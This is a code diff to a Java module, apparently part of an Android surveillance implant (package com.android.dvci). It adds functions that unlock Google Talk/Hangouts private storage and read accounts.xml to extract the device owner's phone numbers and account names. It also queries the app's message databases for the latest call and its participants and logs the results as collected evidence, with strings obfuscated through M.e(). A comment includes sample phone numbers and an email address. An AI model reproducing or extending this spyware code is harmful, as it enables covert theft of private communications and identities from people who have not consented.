@@ -1,6 +1,7 @@
 package com.android.dvci.module.chat;
 
 import android.database.Cursor;
+import android.util.Log;
 
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.db.GenericSqliteHelper;
@@ -8,6 +9,7 @@ import com.android.dvci.db.RecordVisitor;
 import com.android.dvci.file.Path;
 import com.android.dvci.manager.ManagerModule;
 import com.android.dvci.module.ModuleAddressBook;
+import com.android.dvci.module.call.CallInfo;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.StringUtils;
 import com.android.mm.M;
@@ -21,6 +23,8 @@ import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.HashMap;
+import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.concurrent.Semaphore;
 
@@ -36,6 +40,14 @@ public class ChatGoogle extends SubModuleChat {
 	String pObserving = M.e("com.google.android.talk");
 
 	private Semaphore readBabelSemaphore = new Semaphore(1);
+	private static String phone=null;
+
+	public static String getPhone() {
+		if(phone==null){
+			phone=ChatGoogle.readMyPhoneNumber();
+		}
+		return phone;
+	}
 
 	@Override
 	int getProgramId() {
@@ -65,8 +77,11 @@ public class ChatGoogle extends SubModuleChat {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (actualStart)");
 		}
+		phone = readMyPhoneNumber();
+		//getCurrentCall(new CallInfo(false));
 		readChatMessages();
 	}
+
 
 	private void readChatMessages() {
 
@@ -80,12 +95,18 @@ public class ChatGoogle extends SubModuleChat {
 			String babel0 = M.e("babel0.db");
 			String babel1 = M.e("babel1.db");
 
-			String account = readAccount("1.name");
+			String account = readAccountsXml("1.name", "string",null);
+			if (account != null) {
+				ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.GOOGLE, account);
+			}
 			if (StringUtils.isEmpty(account) || !readHangoutMessages(lastLines, babel1, account)) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (readChatMessages) try babel0");
 				}
-				account = readAccount("0.name");
+				account = readAccountsXml("0.name", "string",null);
+				if (account != null) {
+					ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.GOOGLE, account);
+				}
 				readHangoutMessages(lastLines, babel0, account);
 			}
 			readGoogleTalkMessages(lastLines);
@@ -308,42 +329,86 @@ public class ChatGoogle extends SubModuleChat {
 		return conversations;
 
 	}
-
-	private String readAccount(String nameField) {
+	static public ArrayList<String> readAccountsXmlSets(String nameField,String type) {
 		String xmlDir = M.e("/data/data/com.google.android.talk/shared_prefs");
 		String xmlFile = M.e("accounts.xml");
-
 		Path.unprotect(xmlDir, xmlFile, true);
 
+		/* example
+		<set name="1.phone_verification">
+		<string>+393349115140,false,true,1,false</string>
+		<string>+393346405249,false,true,1,false</string>
+		</set>
+		*/
+
 		DocumentBuilder builder;
-		String account = null;
+		ArrayList<String> values = new ArrayList<String>();
 		try {
 			builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
 			Document doc = builder.parse(new File(xmlDir, xmlFile));
-			NodeList defaults = doc.getElementsByTagName("string");
+			NodeList defaults = doc.getElementsByTagName("set");
 			for (int i = 0; i < defaults.getLength(); i++) {
 				Node d = defaults.item(i);
 				NamedNodeMap attributes = d.getAttributes();
 				Node attr = attributes.getNamedItem("name");
 				// nameField = "0.name"
 				if ( attr!=null && nameField.equals(attr.getNodeValue())) {
-					Node child = d.getFirstChild();
-					account = child.getNodeValue();
+					int nNode = d.getChildNodes().getLength();
+					for ( int c=0 ; c < nNode; c++ ) {
+						Node n = d.getChildNodes().item(c);
+						String localName = n.getNodeName();
+						if(localName != null && type.contentEquals(localName)) {
+							String s =n.getTextContent();
+							values.add(s);
+						}
+					}
 					break;
 				}
 			}
 
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (readAccount) Error: " + e);
+				Check.log(TAG + " (readAccountsXml) Error: " + e);
 			}
 		}
-		if (account != null) {
-			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.GOOGLE, account);
+		return values;
+	}
+	static public String readAccountsXml(String nameField, String type,String attribute) {
+		String xmlDir = M.e("/data/data/com.google.android.talk/shared_prefs");
+		String xmlFile = M.e("accounts.xml");
+
+		Path.unprotect(xmlDir, xmlFile, true);
+
+		DocumentBuilder builder;
+		String value = null;
+		try {
+			builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
+			Document doc = builder.parse(new File(xmlDir, xmlFile));
+			NodeList defaults = doc.getElementsByTagName(type);
+			for (int i = 0; i < defaults.getLength(); i++) {
+				Node d = defaults.item(i);
+				NamedNodeMap attributes = d.getAttributes();
+				Node attr = attributes.getNamedItem("name");
+				// nameField = "0.name"
+				if ( attr!=null && nameField.equals(attr.getNodeValue())) {
+					if( attribute == null) {
+						Node child = d.getFirstChild();
+						value = child.getNodeValue();
+					}else{
+						if(attributes.getNamedItem(attribute)!=null){
+							value = attributes.getNamedItem(attribute).getNodeValue();
+						}
+					}
+					break;
+				}
+			}
+
+		} catch (Exception e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (readAccountsXml) Error: " + e);
+			}
 		}
-
-		return account;
-
+		return value;
 	}
 
 	private void readGoogleTalkMessages(long[] lastLines) {
@@ -496,6 +561,187 @@ public class ChatGoogle extends SubModuleChat {
 				Check.log(TAG + " (saveContacts) serialize");
 			}
 			ModuleAddressBook.getInstance().serializeContacts();
+		}
+	}
+
+	public static String readMyPhoneNumber() {
+		String phone = "";
+		String activeAccount = getActiveAccount();
+		if(activeAccount != null) {
+			ArrayList<String> res = readAccountsXmlSets(activeAccount+M.e(".phone_verification"),M.e("string"));
+			if( res!= null && !res.isEmpty()){
+				for(String s: res){
+					if(s.split(",").length >1){
+						phone += s.split(",")[0]+";";
+					}
+				}
+				if(Cfg.DEBUG) {
+					Log.d(TAG, " (readMyPhoneNumber): phone numbers are : " + phone);
+				}
+			}else{
+				/* use the account_name
+				<string name="3.display_name">samsung s3mini</string>
+				<string name="3.account_name">samsungs3minitest1@gmail.com</string>
+				*/
+				phone = readAccountsXml(activeAccount+".account_name",M.e("string"),null);
+			}
+		}
+		return phone;
+	}
+	public static String getActiveAccount() {
+		// recover the active account at the moment of the call:
+		String active = readAccountsXml(M.e("active"),M.e("int"),"value");
+		try{
+			if(Cfg.DEBUG) {
+				Log.d(TAG, " (getActiveAccount): active account is: " + active);
+			}
+			//check value integrity.
+			int n = Integer.parseInt(active);
+		}catch (Exception e){
+			if(Cfg.DEBUG) {
+				Log.d(TAG, " (getActiveAccount): ERROR converting int " + active, e);
+			}
+			active = null;
+		}
+		return active;
+	}
+	public static String getActiveDb() {
+		String dbFile = null;
+		String active = getActiveAccount();
+		if( active!= null) {
+			dbFile = M.e("babel") + active + ".db";
+		}
+		return dbFile;
+	}
+	/**
+	 * Searches all the participant inside the passed string, which is a pipe separated patricipant list
+	 *
+	 * @param helper open db helper
+	 * @param participants list
+	 * @return returns a LinkedHashMap of GtalkEntity, where the key is the id found in the participants table
+	 * id == 1 is the actual account of the owner
+	 */
+
+	public static LinkedHashMap<Integer, GtalkEntity> getParticipants(GenericSqliteHelper helper, String participants) {
+		final LinkedHashMap<Integer, GtalkEntity> _res = new LinkedHashMap<Integer, GtalkEntity>();
+		String filter = "";
+		if (helper == null || participants == null || participants.contentEquals("") ) {
+			if(Cfg.DEBUG) {
+				Log.d(TAG, " (getCurrentCall): ERROR invalid parameters");
+			}
+			return _res;
+		}
+
+		String sqlquery = M.e("select _id,full_name,first_name,phone_id,gaia_id from participants where _id = 1");
+		String[] p;
+		if(participants.contains("|")){
+			p = participants.split("\\|");
+		}else{
+			p = new String[]{participants};
+		}
+
+		for(String id : p){
+
+			try{
+				Integer.parseInt(id);
+				sqlquery += M.e(" or _id = ")+id;
+			}catch (Exception x){
+				if(Cfg.DEBUG) {
+					Log.d(TAG, " (getCurrentCall): ERROR converting int " + id);
+				}
+			}
+		}
+		RecordVisitor visitor = new RecordVisitor() {
+
+			@Override
+			public long cursor(Cursor cursor) {
+				int id = cursor.getInt(0);
+				String name = cursor.getString(1);
+				String gtalk_id = cursor.getString(4);
+				_res.put(id,new GtalkEntity(gtalk_id,id,name));
+				return id;
+			}
+		};
+		try {
+			helper.traverseRawQuery(sqlquery, new String[]{}, visitor);
+		}finally {
+			helper.disposeDb();
+		}
+		LinkedHashMap<Integer, GtalkEntity> res = new LinkedHashMap<Integer, GtalkEntity>();
+			for (String id : p) {
+				try {
+					res.put(Integer.parseInt(id),_res.get(Integer.parseInt(id)));
+				}catch (Exception e){
+					if(Cfg.DEBUG) {
+						Log.d(TAG, " (getCurrentCall): ERROR converting int " + id);
+					}
+				}
+			}
+
+		return res;
+	}
+
+	public static boolean getCurrentCall(final CallInfo callInfo) {
+		String dbDir = M.e("/data/data/com.google.android.talk/databases");
+		String dbFile = getActiveDb();
+		String sqlquery = M.e("select m.timestamp, m.author_chat_id, m.participant_keys, m.type from messages as m where m.type = 8 and m.timestamp not null order by m.timestamp desc limit 1");
+		RecordVisitor visitor = new RecordVisitor() {
+
+			@Override
+			public long cursor(Cursor cursor) {
+				long createTime = cursor.getLong(0);
+				callInfo.account = cursor.getString(1);
+				callInfo.timestamp = new Date(createTime);
+				if(Cfg.DEBUG) {
+					Log.d(TAG, " (getCurrentCall): timestamp=" + createTime);
+				}
+				callInfo.valid = true;
+				callInfo.peer = cursor.getString(2);
+				return createTime;
+			}
+		};
+		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
+		if (helper == null) {
+			return false;
+		}
+
+		try {
+			helper.traverseRawQuery(sqlquery, new String[]{}, visitor);
+			if(callInfo.valid){
+				LinkedHashMap<Integer,GtalkEntity> peers = getParticipants(helper, callInfo.peer);
+				if (peers.size() > 1) {
+				callInfo.peer = "";
+				for(int p : peers.keySet()){
+					if(p!=1){
+						callInfo.peer += peers.get(p).displayName+",";
+					}else{
+						if (peers.get(p).gtalk_id.contentEquals(callInfo.account)) {
+							callInfo.incoming = false;
+						} else {
+							callInfo.incoming = true;
+						}
+					}
+				}
+				} else {
+					callInfo.valid = false;
+				}
+			}
+		}finally {
+			helper.disposeDb();
+		}
+
+		return callInfo.valid;
+	}
+
+	private static class GtalkEntity {
+		public String gtalk_id;
+		public int _id;
+		public String displayName;
+
+		private GtalkEntity(String gtalk_id, int _id, String displayName) {
+			this.gtalk_id = gtalk_id;
+			this._id = _id;
+			this.displayName = displayName;
 		}
 	}
 }
